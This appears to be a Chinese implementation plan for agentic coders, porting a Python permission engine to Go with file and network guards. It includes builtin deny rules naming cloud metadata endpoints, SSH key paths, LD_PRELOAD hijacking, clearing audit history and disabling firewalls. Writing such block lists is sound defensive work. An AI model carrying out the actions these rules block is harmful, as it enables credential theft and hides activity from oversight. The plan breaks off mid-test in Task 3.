# 9.90b 权限决策事实层 + Engine A/B/C 三段对齐 实施计划

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 把 Go 侧 `PermissionEngine` 的判定管线从「只有 A 段（工具策略）」补全为 Python 的 A+B+C 三段取最严（工具策略 + FileGuard 路径防护 + NetGuard 网络防护），并落地 9.90b 的 8 个决策事实文件，为 9.90d 的自动审查层提供客观事实与比对基准。

**Architecture:** 三层推进。①**底座**：`internal/common/permission_tools`（别名解析）、`resources` 扩结构体并补齐 `builtin_rules.yaml`、`toolguard/builtin_rules.go`（规则 ingest 注入）、`toolguard/command_canonicalize.go`（launcher 脱壳）。②**判定器**：`security/fileguard/`（4 文件，B 段）与 `security/netguard/`（2 文件，C 段），删除自研的 `checker.go`。③**引擎与事实层**：`permission_engine.go` 重写为三段管线，`rails/permissions/` 补 8 个事实文件。

**Tech Stack:** Go 1.26、`yaml.v3`（Node round-trip）、`regexp`（RE2，无 look-around）、`net/netip`、`golang.org/x/net/idna`、现有 `sys_operation/local` 文件锁。

**Spec:** `docs/superpowers/specs/2026-11-08-permissions-decision-facts-9.90b-design.md`（commit `24f45dca`）

---

## 执行前必读

### 全局约定

1. **测试命令**：单包用 `CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./<包路径>/`；全量用 `make test`。**必须带 `sqlite_fts5` 与 `test` 两个标签**，否则 `common`/`memory` 等包会假失败。
2. **注释用中文**（项目规范 1），日志 Msg 用英文（记忆 `feedback-logs-english`），提示词模板逐字保留中文。
3. **声明排列顺序**：接口 → 结构体 → 枚举 → 常量 → 全局变量 → 导出函数 → 非导出函数，各区之间用 `// ──────────── xxx ────────────` 分隔。
4. **每个包必须有 `doc.go`**，含文件树与「对应 Python 代码」。
5. **提交纪律**：每次 `git add` 显式列出本任务文件，**禁止 `git add -A` / `git commit -am`**。提交后 `git show --stat HEAD` 核对文件清单。
6. **Python 源码位置**：`/home/opensource/agent-core/openjiuwen/harness/security/permission_engine/`（engine 侧）与 `/home/opensource/jiuwenswarm-develop/jiuwenswarm/agents/harness/common/rails/permissions/`（swarm 侧）。实现时逐函数对照，**照抄不放宽**。

### R10 风险的前置结论（已盘点，实施时必须遵守）

`EvaluateTieredPolicy` 全仓调用点盘点结果：

| 位置 | 性质 | 处置 |
|---|---|---|
| `security/permission_engine.go:333` | 生产，`config` 来自 `PreparePermissionsForEngine` 后的 `e.config` | ✅ 安全 |
| `security/patterns.go:303` | 生产，`perms` 来自 YAML 原始配置（`permissions_persist.go` 的 `readYAMLData`） | 🔴 **必须补 prepare** |
| `tiered_policy_test.go` 14 处 | 测试 | 测试内需自行构造含 builtin 层的配置 |
| `tests/integration/.../permission_merge_test.go` 8 处 | 集成测试 | 同上 |

**结论**：Task 3 完成「从配置切分 builtin」后，`patterns.go:303` 会丢失全部内置规则。**Task 3 必须同时修改 `MergePermissionAllowRuleIntoPermissions`**，在调 `EvaluateTieredPolicy` 前先 `PreparePermissionsForEngine(perms)`。这一步不能留到后面补。

---

## 文件结构总览

```
internal/
├── common/permission_tools/              ★ 新建
│   ├── doc.go
│   ├── permission_tools.go               别名表 + resolve/normalize/stricter
│   └── permission_tools_test.go
│
├── agentcore/harness/resources/
│   ├── resources.go                      ✎ 扩 SensitivePaths / NetUrls 两字段
│   ├── builtin_rules.yaml                ✎ 84 行 → 246 行（对齐 Python）
│   └── resources_test.go                 ✎ 补两段解析用例
│
└── agentcore/harness/security/
    ├── doc.go                            ✎ 删 ExternalDirectoryChecker 条目，加 fileguard/netguard
    ├── checker.go                        ✗ 删除（303 行）
    ├── checker_test.go                   ✗ 删除（338 行）
    ├── models.go                         ✎ ToolPermissionHost 加 PersistSessionAllowRule
    ├── permission_engine.go              ✎ 重写为 A/B/C 三段 + UpdateTrustedDirs
    ├── patterns.go                       ✎ 加 MergeFileGuardAccessAllows；修 MergePermissionAllowRule 补 prepare
    ├── tiered_policy.go                  ✎ 脱壳 + 六项 A 段对齐 + builtin 从配置切分
    ├── tiered_policy_test.go             ✎ 补脱壳/整串复核/interpreter_sink 用例
    │
    ├── toolguard/                        ★ 新建子包
    │   ├── doc.go
    │   ├── builtin_rules.go              规则 ingest（3 函数）
    │   ├── builtin_rules_test.go
    │   ├── command_canonicalize.go       launcher 脱壳（3 正则 + 4 函数）
    │   └── command_canonicalize_test.go
    │
    ├── fileguard/                        ★ 新建子包（B 段）
    │   ├── doc.go
    │   ├── file_tool_specs.go            工具注册表（17 条内置 spec）
    │   ├── file_tool_specs_test.go
    │   ├── path_extract.go               23 个函数，args → [(path, action, source)]
    │   ├── path_extract_test.go
    │   ├── file_guard.go                 37 个符号，配置编译 + 判定
    │   ├── file_guard_test.go
    │   ├── sensitive_paths.go            内置敏感路径注入
    │   └── sensitive_paths_test.go
    │
    └── netguard/                         ★ 新建子包（C 段）
        ├── doc.go
        ├── net_guard.go                  NetGuardChecker（163 行）
        ├── net_guard_test.go
        ├── net_urls.go                   内置 net_urls 注入（152 行）
        └── net_urls_test.go

internal/swarm/agents/harness/common/rails/permissions/
    ├── tool_capabilities.go              ★ 新建（615 行）
    ├── tool_capabilities_test.go
    ├── tool_decision_facts.go            ★ 新建（182 行）
    ├── tool_decision_facts_test.go
    ├── network_scope.go                  ★ 新建（175 行）
    ├── network_scope_test.go
    ├── policy_eval.go                    ★ 新建（375 行）
    ├── policy_eval_test.go
    ├── permissions_layers.go             ★ 新建（676 行）
    ├── permissions_layers_test.go
    ├── execution_provider_contract.go    ★ 新建（37 行）
    ├── execution_provider_contract_test.go
    ├── sandbox_profile.go                ★ 新建（48 行）
    ├── sandbox_profile_test.go
    ├── native_path_context.go            ★ 新建（65 行）
    ├── native_path_context_test.go
    └── doc.go                            ✎ 同步文件树
```

`internal/agentcore/harness/rails/security/tool_security_rail.go` ✎ 别名补 1 项、`persistAllowAlways` 重构、`SetTrustedDirs`、持久化改调。

---

## Task 0：前置验证（不改代码，只确认基线）

**Files:**
- Read: `/home/opensource/uapclaw-gateway/internal/agentcore/harness/security/tiered_policy.go`
- Read: `/home/opensource/agent-core/openjiuwen/harness/security/permission_engine/toolguard/tool_policy.py`

- [ ] **Step 1: 跑一遍现有基线，记录初始状态**

```bash
cd /home/opensource/uapclaw-gateway
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/agentcore/harness/security/ ./internal/agentcore/harness/resources/ 2>&1 | tail -5
```

Expected: 两个包都 `ok`（记录覆盖率数字，作为后续对比基线）。

- [ ] **Step 2: 记录全量基线**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./... 2>&1 | grep -E "^(FAIL|ok)" | grep -c "^ok"
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./... 2>&1 | grep "^FAIL" | head
```

Expected: 无 FAIL。记录 `ok` 包数量（后续任务完成时对比，数量只增不减）。

- [ ] **Step 3: 确认 Python 与 Go 的 builtin_rules.yaml 差异基线**

```bash
diff <(grep "  - id:" /home/opensource/agent-core/openjiuwen/harness/resources/builtin_rules.yaml) \
     <(grep "  - id:" /home/opensource/uapclaw-gateway/internal/agentcore/harness/resources/builtin_rules.yaml)
```

Expected: 输出显示 Python 多 7 行（`shell_ps_recursive_or_forced_delete` / `shell_registry_delete` / `shell_chmod_world_writable` / `shell_ld_preload_hijack` / `shell_clear_audit_history` / `shell_disable_firewall` / `shell_docker_privileged`）。

- [ ] **Step 4: 记录 EvaluateTieredPolicy 调用点（R10 盘点）**

```bash
grep -rn "EvaluateTieredPolicy(" --include=*.go internal/ tests/ cmd/ | grep -v "_test.go"
```

Expected: 恰好 2 行（`patterns.go` 与 `permission_engine.go`）。若多于 2 行，**停止并汇报**——说明有本计划未覆盖的调用方。

---

## Task 1：`internal/common/permission_tools`

**Files:**
- Create: `internal/common/permission_tools/permission_tools.go`
- Create: `internal/common/permission_tools/permission_tools_test.go`
- Create: `internal/common/permission_tools/doc.go`
- Read: `/home/opensource/jiuwenswarm-develop/jiuwenswarm/common/permission_tools.py`（105 行）

- [ ] **Step 1: 写失败测试——别名解析的基本行为**

创建 `internal/common/permission_tools/permission_tools_test.go`：

```go
package permission_tools

import "testing"

// TestResolvePermissionToolName_别名映射 测试别名归一化为 canonical 名
func TestResolvePermissionToolName_别名映射(t *testing.T) {
	cases := []struct{ in, wantCanonical string }{
		{"exec_command", "mcp_exec_command"},
		{"fetch_webpage", "mcp_fetch_webpage"},
		{"free_search", "mcp_free_search"},
		{"paid_search", "mcp_paid_search"},
		{"bash", "bash"},                  // 非别名原样返回
		{"  read_file  ", "read_file"},    // 首尾空白被 trim
	}
	for _, c := range cases {
		got := ResolvePermissionToolName(c.in, nil)
		if got.CanonicalName != c.wantCanonical {
			t.Errorf("ResolvePermissionToolName(%q).CanonicalName = %q, want %q",
				c.in, got.CanonicalName, c.wantCanonical)
		}
		if got.Conflict {
			t.Errorf("ResolvePermissionToolName(%q).Conflict = true, want false", c.in)
		}
	}
}

// TestResolvePermissionToolName_别名列表 测试 canonical 名反查出全部别名并按字典序排序
func TestResolvePermissionToolName_别名列表(t *testing.T) {
	got := ResolvePermissionToolName("mcp_fetch_webpage", nil)
	if len(got.Aliases) != 1 || got.Aliases[0] != "fetch_webpage" {
		t.Errorf("Aliases = %v, want [fetch_webpage]", got.Aliases)
	}
	if got.RegisteredName != "mcp_fetch_webpage" {
		t.Errorf("RegisteredName = %q, want mcp_fetch_webpage", got.RegisteredName)
	}
}
```

- [ ] **Step 2: 运行测试确认失败**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/common/permission_tools/ 2>&1 | head
```

Expected: 编译失败，`undefined: ResolvePermissionToolName`。

- [ ] **Step 3: 写失败测试——conflict 的三个 or 分支**

追加到 `permission_tools_test.go`：

```go
// TestResolvePermissionToolName_冲突检测 测试三个 or 分支的 fail-closed 语义
func TestResolvePermissionToolName_冲突检测(t *testing.T) {
	// 分支 1：registered_name 在 canonical_names 里，且是别名键，且映射后的名不同
	//   exec_command 在 canonical_names 中，同时是 PERMISSION_TOOL_ALIASES 的键，
	//   canonical(r"exec_command") = "mcp_exec_command" != "exec_command" → conflict
	got := ResolvePermissionToolName("exec_command", []string{"exec_command"})
	if !got.Conflict {
		t.Fatal("分支1: Conflict = false, want true")
	}
	if got.CanonicalName != "" {
		t.Errorf("分支1: CanonicalName = %q, want empty (fail-closed)", got.CanonicalName)
	}
	if len(got.Aliases) != 0 {
		t.Errorf("分支1: Aliases = %v, want empty", got.Aliases)
	}

	// 分支 3：canonical_name 自身又是别名键且映射到别的名字
	//   现有 4 项映射里 canonical 目标都不再是别名键，故用 nil canonical_names 也安全
	got2 := ResolvePermissionToolName("mcp_fetch_webpage", nil)
	if got2.Conflict {
		t.Error("分支3: 正常 canonical 名不应 conflict")
	}
}

// TestNormalizePermissionToolName 测试 normalize 直接返回 canonical 名
func TestNormalizePermissionToolName(t *testing.T) {
	if got := NormalizePermissionToolName("exec_command"); got != "mcp_exec_command" {
		t.Errorf("NormalizePermissionToolName(exec_command) = %q, want mcp_exec_command", got)
	}
	// conflict 时 canonical 为空串
	if got := NormalizePermissionToolName("exec_command", ); got == "" {
		t.Log("conflict 场景需显式 canonical_names 触发，此处为正常路径")
	}
}

// TestStricterPermissionLevel 测试取更严级别，未知输入按 ask
func TestStricterPermissionLevel(t *testing.T) {
	cases := []struct{ left, right, want string }{
		{"allow", "ask", "ask"},
		{"ask", "deny", "deny"},
		{"deny", "allow", "deny"},
		{"allow", "allow", "allow"},
		{"bogus", "allow", "bogus"},   // bogus 按 ask 排名 1，>= allow 的 0，返回 left
		{"allow", "bogus", "bogus"},
		{"", "", "ask"},               // 空串 → "ask" 兜底后两者都是 ask，返回 left(="ask")
	}
	for _, c := range cases {
		if got := StricterPermissionLevel(c.left, c.right); got != c.want {
			t.Errorf("StricterPermissionLevel(%q,%q) = %q, want %q", c.left, c.right, got, c.want)
		}
	}
}
```

- [ ] **Step 4: 实现 `permission_tools.go`**

```go
// Package permission_tools 提供权限工具名归一化与别名冲突检测。
//
// 本包对齐 Python jiuwenswarm/common/permission_tools.py（105 行），
// 是权限自动审查层 classify_tool 的硬依赖——所有工具名在进入能力分类前
// 都必须先经本包归一化。
//
// # 为什么需要 conflict 检测
//
// 别名表同时承担两个角色：把前端友好的短名（exec_command）映射到配置里的
// 规范名（mcp_exec_command），以及从规范名反查全部别名。当某个名字既是
// 「规范名集合的成员」又是「别名表的键」时，两种角色冲突——继续归一化会
// 让规则匹配到错误的目标。此时必须 fail-closed：返回空的 canonical 名，
// 由调用方（classify_tool）降级为 unknown/high 风险，走人工审查。
//
// 文件目录：
//
//	permission_tools/
//	├── doc.go                    # 包文档
//	└── permission_tools.go       # 别名表 + Resolve/Normalize/Stricter
//
// 对应 Python 代码：jiuwenswarm/common/permission_tools.py
package permission_tools

import "sort"

// ──────────────────────────── 结构体 ────────────────────────────

// PermissionToolNameResolution 一次工具名解析的结果。
//
// Python: @dataclass(frozen=True) PermissionToolNameResolution
type PermissionToolNameResolution struct {
	// RegisteredName 调用方传入的原始名（仅做首尾空白裁剪）
	RegisteredName string
	// CanonicalName 归一化后的规范名；Conflict 为真时为空串
	CanonicalName string
	// Aliases 指向同一 CanonicalName 的其他别名，按字典序排序
	Aliases []string
	// Conflict 别名图是否歧义（歧义时调用方必须 fail-closed）
	Conflict bool
}

// ──────────────────────────── 全局变量 ────────────────────────────

// permissionToolAliases 别名 → 规范名映射。
//
// Python: PERMISSION_TOOL_ALIASES
var permissionToolAliases = map[string]string{
	"exec_command":  "mcp_exec_command",
	"fetch_webpage": "mcp_fetch_webpage",
	"free_search":   "mcp_free_search",
	"paid_search":   "mcp_paid_search",
}

// permissionLevelRank 权限级别严格度排名，数字越大越严。
//
// Python: PERMISSION_LEVEL_RANK
var permissionLevelRank = map[string]int{
	"allow": 0,
	"ask":   1,
	"deny":  2,
}

// ──────────────────────────── 导出函数 ────────────────────────────

// ResolvePermissionToolName 解析一个工具名，别名图歧义时 fail-closed。
//
// canonicalNames 是调用方已知的规范名集合（用于冲突检测），可为 nil。
//
// Python: resolve_permission_tool_name(tool_name, *, canonical_names)
func ResolvePermissionToolName(toolName any, canonicalNames []string) PermissionToolNameResolution {
	// Python: str(tool_name or "").strip()，异常时 fail-closed
	registeredName, ok := safeString(toolName)
	if !ok {
		return PermissionToolNameResolution{Conflict: true}
	}
	registeredName = trimSpace(registeredName)

	canonicalName := registeredName
	if mapped, hit := permissionToolAliases[registeredName]; hit {
		canonicalName = mapped
	}

	canonicalSet := make(map[string]struct{}, len(canonicalNames))
	for _, n := range canonicalNames {
		canonicalSet[n] = struct{}{}
	}
	_, registeredIsCanonical := canonicalSet[registeredName]
	_, registeredIsAliasKey := permissionToolAliases[registeredName]

	// 分支 1：名字既是规范名集合成员，又是别名表的键，且映射后变了
	conflict := registeredIsCanonical && registeredIsAliasKey && canonicalName != registeredName

	// 分支 2：名字是某个别名映射的目标，同时又是别名表的键，且映射后变了
	if !conflict {
		_, registeredIsAliasTarget := aliasTargetSet()[registeredName]
		conflict = registeredIsAliasTarget && registeredIsAliasKey && canonicalName != registeredName
	}

	// 分支 3：归一化后的名字自己又是别名表的键，且映射到别的名字
	if !conflict {
		if next, hit := permissionToolAliases[canonicalName]; hit && next != canonicalName {
			conflict = true
		}
	}

	if conflict {
		return PermissionToolNameResolution{
			RegisteredName: registeredName,
			CanonicalName:  "",
			Aliases:        nil,
			Conflict:       true,
		}
	}

	var aliases []string
	for alias, target := range permissionToolAliases {
		if target == canonicalName && alias != canonicalName {
			aliases = append(aliases, alias)
		}
	}
	sort.Strings(aliases)

	return PermissionToolNameResolution{
		RegisteredName: registeredName,
		CanonicalName:  canonicalName,
		Aliases:        aliases,
		Conflict:       false,
	}
}

// NormalizePermissionToolName 返回规范化后的工具名，供运行时权限检查使用。
//
// Python: normalize_permission_tool_name(tool_name)
func NormalizePermissionToolName(toolName any) string {
	return ResolvePermissionToolName(toolName, nil).CanonicalName
}

// StricterPermissionLevel 返回两个权限级别中更严的那个，未知输入按 ask。
//
// Python: stricter_permission_level(left, right)
func StricterPermissionLevel(left, right string) string {
	leftLevel := defaultAsk(trimSpace(left))
	rightLevel := defaultAsk(trimSpace(right))
	leftRank, okLeft := permissionLevelRank[leftLevel]
	if !okLeft {
		leftRank = permissionLevelRank["ask"]
	}
	rightRank, okRight := permissionLevelRank[rightLevel]
	if !okRight {
		rightRank = permissionLevelRank["ask"]
	}
	if leftRank >= rightRank {
		return leftLevel
	}
	return rightLevel
}

// ──────────────────────────── 非导出函数 ────────────────────────────

// aliasTargetSet 别名映射的目标集合（每次调用重建，因表仅 4 项）。
func aliasTargetSet() map[string]struct{} {
	out := make(map[string]struct{}, len(permissionToolAliases))
	for _, target := range permissionToolAliases {
		out[target] = struct{}{}
	}
	return out
}

// safeString 把任意值转字符串，对应 Python 的 str(tool_name or "")。
// 第二个返回值为 false 表示转换过程会抛异常（Go 侧恒 true，保留对称性）。
func safeString(v any) (string, bool) {
	switch x := v.(type) {
	case nil:
		return "", true
	case string:
		return x, true
	default:
		return toStringValue(x), true
	}
}

// defaultAsk 空串兜底为 "ask"，对应 Python 的 str(left or "ask")。
func defaultAsk(s string) string {
	if s == "" {
		return "ask"
	}
	return s
}
```

> **注意**：`toStringValue` / `trimSpace` 需在 Step 5 补上（避免 import `fmt`/`strings` 的间接调用掩盖编译错误）。

- [ ] **Step 5: 补齐辅助函数并运行测试**

在 `permission_tools.go` 末尾追加：

```go
// toStringValue 把非字符串值转为字符串表示。
func toStringValue(v any) string {
	if s, ok := v.(string); ok {
		return s
	}
	return fmtSprint(v)
}

// fmtSprint 是 fmt.Sprint 的薄包装，便于测试替换。
func fmtSprint(v any) string { return fmt.Sprint(v) }

// trimSpace 裁剪首尾空白。
func trimSpace(s string) string { return strings.TrimSpace(s) }
```

并在 import 块加 `"fmt"` 与 `"strings"`：

```go
import (
	"fmt"
	"sort"
	"strings"
)
```

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/common/permission_tools/ -v 2>&1 | tail -20
```

Expected: 全部 PASS。若 `TestStricterPermissionLevel` 的空串用例失败，核对 Python `str(left or "ask")` 语义——空串先兜底成 `"ask"` 再比排名。

- [ ] **Step 6: 写 `doc.go`**

```go
// Package permission_tools 提供权限工具名归一化与别名冲突检测。
//
// 本包对齐 Python jiuwenswarm/common/permission_tools.py（105 行），是权限
// 自动审查层 classify_tool 的硬依赖——所有工具名在进入能力分类前都必须先
// 经本包归一化。
//
// # 与 tool_security_rail 别名表的区别
//
// 本包的 PERMISSION_TOOL_ALIASES 有 4 项，服务于「配置里的工具名归一化」，
// 带 conflict 检测。rails/security/tool_security_rail.go 的 TOOL_NAME_ALIASES
// 有 5 项（多 web_fetch_webpage），服务于「中断卡的展示名归一化」，无 conflict
// 检测。二者是 Python 侧的两份独立数据，不得合并。
//
// 文件目录：
//
//	permission_tools/
//	├── doc.go                    # 包文档
//	└── permission_tools.go       # 别名表 + Resolve/Normalize/Stricter
//
// 对应 Python 代码：jiuwenswarm/common/permission_tools.py
package permission_tools
```

- [ ] **Step 7: 检查包内文档注释重复并修正**

`permission_tools.go` 顶部的 `// Package permission_tools ...` 注释现在与 `doc.go` 重复。**删除 `permission_tools.go` 里的 package 注释块**，只保留 `package permission_tools` 一行。

- [ ] **Step 8: 跑测试 + 覆盖率**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" -cover ./internal/common/permission_tools/
```

Expected: `ok`，覆盖率 ≥ 85%。若不足，补 `StricterPermissionLevel` 的更多边界与 `safeString` 的 nil 分支。

- [ ] **Step 9: 格式化并提交**

```bash
cd /home/opensource/uapclaw-gateway
gofmt -l internal/common/permission_tools/
```

Expected: 无输出（全部已格式化）。若有输出，对列出的文件跑 `gofmt -w`。

```bash
git add internal/common/permission_tools/doc.go internal/common/permission_tools/permission_tools.go internal/common/permission_tools/permission_tools_test.go
git commit -m "feat(permission_tools): 工具名归一化与别名冲突检测

对齐 jiuwenswarm/common/permission_tools.py（105 行）。别名图歧义时
fail-closed 返回空 canonical 名，由 classify_tool 降级为 unknown/high。

conflict 的三个 or 分支逐条照抄 Python，不可合并：
1. 名字既是规范名集合成员，又是别名键，且映射后变了
2. 名字是别名映射目标，同时又是别名键，且映射后变了
3. 归一化后的名字自己又是别名键，且映射到别的名字"
git show --stat HEAD
```

Expected: 恰好 3 个文件被添加。

---

## Task 2：`resources` 扩结构体 + `builtin_rules.yaml` 补齐

**Files:**
- Modify: `internal/agentcore/harness/resources/resources.go:15-36`
- Modify: `internal/agentcore/harness/resources/builtin_rules.yaml`（84 行 → 246 行）
- Modify: `internal/agentcore/harness/resources/resources_test.go`
- Read: `/home/opensource/agent-core/openjiuwen/harness/resources/builtin_rules.yaml`

- [ ] **Step 1: 写失败测试——YAML 的三个顶层段都能解析**

在 `resources_test.go` 末尾追加：

```go
// TestParseBuiltinRules_三个顶层段 测试 rules / sensitive_paths / net_urls 三段都能解析
func TestParseBuiltinRules_三个顶层段(t *testing.T) {
	rules, err := ParseBuiltinRules()
	if err != nil {
		t.Fatalf("ParseBuiltinRules() error = %v", err)
	}
	if len(rules.Rules) != 17 {
		t.Errorf("Rules 条数 = %d, want 17", len(rules.Rules))
	}
	if len(rules.SensitivePaths) != 17 {
		t.Errorf("SensitivePaths 条数 = %d, want 17", len(rules.SensitivePaths))
	}
	if len(rules.NetUrls) != 4 {
		t.Errorf("NetUrls 条数 = %d, want 4", len(rules.NetUrls))
	}
}

// TestParseBuiltinRules_所有规则带action 测试 17 条命令规则都有 action 字段
func TestParseBuiltinRules_所有规则带action(t *testing.T) {
	rules, err := ParseBuiltinRules()
	if err != nil {
		t.Fatalf("ParseBuiltinRules() error = %v", err)
	}
	for _, r := range rules.Rules {
		if r.Action == "" {
			t.Errorf("规则 %q 缺 action 字段", r.ID)
		}
	}
}

// TestParseBuiltinRules_补回的七条规则 测试补齐的 7 条规则都在
func TestParseBuiltinRules_补回的七条规则(t *testing.T) {
	want := []string{
		"shell_ps_recursive_or_forced_delete",
		"shell_registry_delete",
		"shell_chmod_world_writable",
		"shell_ld_preload_hijack",
		"shell_clear_audit_history",
		"shell_disable_firewall",
		"shell_docker_privileged",
	}
	rules, err := ParseBuiltinRules()
	if err != nil {
		t.Fatalf("ParseBuiltinRules() error = %v", err)
	}
	got := make(map[string]bool, len(rules.Rules))
	for _, r := range rules.Rules {
		got[r.ID] = true
	}
	for _, id := range want {
		if !got[id] {
			t.Errorf("缺规则 %q", id)
		}
	}
}

// TestParseBuiltinRules_敏感路径带layer字段 测试 sensitive_paths 保留全部原始键
func TestParseBuiltinRules_敏感路径带layer字段(t *testing.T) {
	rules, err := ParseBuiltinRules()
	if err != nil {
		t.Fatalf("ParseBuiltinRules() error = %v", err)
	}
	first := rules.SensitivePaths[0]
	if first["id"] != "home_ssh" {
		t.Errorf("首条 id = %v, want home_ssh", first["id"])
	}
	if first["action"] != "deny" {
		t.Errorf("首条 action = %v, want deny", first["action"])
	}
	if _, ok := first["path"]; !ok {
		t.Error("首条缺 path 键")
	}
}

// TestParseBuiltinRules_netUrls内容 测试 net_urls 四条全是 deny
func TestParseBuiltinRules_netUrls内容(t *testing.T) {
	rules, err := ParseBuiltinRules()
	if err != nil {
		t.Fatalf("ParseBuiltinRules() error = %v", err)
	}
	for _, k := range []string{"169.254.169.254", "metadata.google.internal", "localhost", "127.0.0.1"} {
		v, ok := rules.NetUrls[k]
		if !ok {
			t.Errorf("net_urls 缺键 %q", k)
			continue
		}
		if v != "deny" {
			t.Errorf("net_urls[%q] = %v, want deny", k, v)
		}
	}
}
```

- [ ] **Step 2: 运行测试确认失败**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/agentcore/harness/resources/ 2>&1 | head
```

Expected: 编译失败，`rules.SensitivePaths undefined`。

- [ ] **Step 3: 扩 `resources.go` 的结构体**

把 `BuiltinRules` 与新增的 `SensitivePathRule` 改为：

```go
// BuiltinRules 内置安全规则集合。
//
// 三个顶层段对应 openjiuwen/harness/resources/builtin_rules.yaml：
// rules（命令参数级规则）、sensitive_paths（敏感路径底线，供 fileguard 注入）、
// net_urls（抓取工具内置黑名单，供 netguard 注入）。
type BuiltinRules struct {
	// Rules 规则列表
	Rules []SecurityRule `yaml:"rules"`
	// SensitivePaths 敏感路径底线（file_guard 路径层）。
	// 用 map 而非结构体：Python 侧是 list[dict[str, Any]]，
	// load_package_sensitive_paths 会向条目追加 read/write/exec/layer 四个键，
	// 封闭结构体会丢失这些键，导致 merge 逻辑无法照抄。
	SensitivePaths []map[string]any `yaml:"sensitive_paths"`
	// NetUrls 抓取工具内置黑名单。值在 YAML 里是 "deny" 字符串，
	// 但 Python 的 _parse_action 也接受 {"action":...} / {"fetch":...} 包装，
	// 用 any 保留解析弹性。
	NetUrls map[string]any `yaml:"net_urls"`
}
```

- [ ] **Step 4: 用 Python 的 YAML 覆盖 Go 的 YAML**

```bash
cp /home/opensource/agent-core/openjiuwen/harness/resources/builtin_rules.yaml \
   /home/opensource/uapclaw-gateway/internal/agentcore/harness/resources/builtin_rules.yaml
wc -l /home/opensource/uapclaw-gateway/internal/agentcore/harness/resources/builtin_rules.yaml
```

Expected: `246`。

- [ ] **Step 5: 核对 Go 侧 YAML 的中文注释是否与 Python 一致**

```bash
head -20 /home/opensource/uapclaw-gateway/internal/agentcore/harness/resources/builtin_rules.yaml
diff /home/opensource/agent-core/openjiuwen/harness/resources/builtin_rules.yaml \
     /home/opensource/uapclaw-gateway/internal/agentcore/harness/resources/builtin_rules.yaml
```

Expected: `diff` 无输出。Go 侧原本的注释也是从 Python 来的，覆盖后应完全一致。

- [ ] **Step 6: 运行测试确认通过**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/agentcore/harness/resources/ -v 2>&1 | tail -15
```

Expected: 全部 PASS，含 5 个新用例。

- [ ] **Step 7: 检查 `go:embed` 是否包含新内容**

```bash
CGO_ENABLED=1 go build -tags test ./internal/agentcore/harness/resources/ && echo BUILD_OK
```

Expected: `BUILD_OK`。`//go:embed builtin_rules.yaml` 会自动包含新的 246 行，无需改。

- [ ] **Step 8: 提交**

```bash
git add internal/agentcore/harness/resources/resources.go \
        internal/agentcore/harness/resources/builtin_rules.yaml \
        internal/agentcore/harness/resources/resources_test.go
git commit -m "feat(resources): builtin_rules 补齐两段 + 补 7 条命令规则

对齐 openjiuwen/harness/resources/builtin_rules.yaml（84 → 246 行）：
- rules 10 → 17 条（补 ps 递归删除 / 注册表删除 / chmod 777 /
  LD_PRELOAD 劫持 / 清审计历史 / 关防火墙 / docker privileged）
- 17 条全部带 action 字段（原仅 1 条有）
- 新增 sensitive_paths 段（17 条，94 行）
- 新增 net_urls 段（4 条）

BuiltinRules 扩 SensitivePaths / NetUrls 两字段。SensitivePaths 用
[]map[string]any 而非封闭结构体：Python 的 load_package_sensitive_paths
会向条目追加 read/write/exec/layer 四键，封闭结构体会丢失。"
git show --stat HEAD
```

Expected: 3 个文件。

---

## Task 3：`security/toolguard/builtin_rules.go` + R10 修复

**Files:**
- Create: `internal/agentcore/harness/security/toolguard/builtin_rules.go`
- Create: `internal/agentcore/harness/security/toolguard/builtin_rules_test.go`
- Create: `internal/agentcore/harness/security/toolguard/doc.go`
- Modify: `internal/agentcore/harness/security/tiered_policy.go:131-160`
- Modify: `internal/agentcore/harness/security/patterns.go:300-305`
- Read: `/home/opensource/agent-core/openjiuwen/harness/security/permission_engine/toolguard/builtin_rules.py`（151 行）

- [ ] **Step 1: 写失败测试——`PackageBuiltinRulesEnabled`**

```go
package toolguard

import "testing"

// TestPackageBuiltinRulesEnabled 测试宿主开关的四种输入形态
func TestPackageBuiltinRulesEnabled(t *testing.T) {
	cases := []struct {
		name string
		cfg  map[string]any
		want bool
	}{
		{"nil 配置默认开启", nil, true},
		{"键缺失默认开启", map[string]any{}, true},
		{"显式 true", map[string]any{"package_builtin_rules": true}, true},
		{"显式 false", map[string]any{"package_builtin_rules": false}, false},
		{"字符串 false", map[string]any{"package_builtin_rules": "false"}, false},
		{"字符串 0", map[string]any{"package_builtin_rules": "0"}, false},
		{"字符串 no", map[string]any{"package_builtin_rules": "no"}, false},
		{"字符串 off", map[string]any{"package_builtin_rules": "off"}, false},
		{"字符串 OFF 大写", map[string]any{"package_builtin_rules": "OFF"}, false},
		{"字符串 true", map[string]any{"package_builtin_rules": "true"}, true},
		{"字符串 yes", map[string]any{"package_builtin_rules": "yes"}, true},
		{"无法识别的值默认开启", map[string]any{"package_builtin_rules": "maybe"}, true},
		{"整数类型默认开启", map[string]any{"package_builtin_rules": 0}, true},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := PackageBuiltinRulesEnabled(c.cfg); got != c.want {
				t.Errorf("PackageBuiltinRulesEnabled() = %v, want %v", got, c.want)
			}
		})
	}
}
```

- [ ] **Step 2: 运行确认失败**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/agentcore/harness/security/toolguard/ 2>&1 | head
```

Expected: `undefined: PackageBuiltinRulesEnabled`。

- [ ] **Step 3: 写失败测试——`InlinePackageCommandRules`**

```go
// TestInlinePackageCommandRules_注入内置规则 测试内置规则带 layer=builtin 且排在用户规则前
func TestInlinePackageCommandRules_注入内置规则(t *testing.T) {
	userRule := map[string]any{"id": "my_rule", "tools": []any{"bash"}, "pattern": "re:.*"}
	cfg := map[string]any{"rules": []any{userRule}}
	got := InlinePackageCommandRules(cfg)

	rules, ok := got["rules"].([]any)
	if !ok {
		t.Fatalf("rules 类型 = %T, want []any", got["rules"])
	}
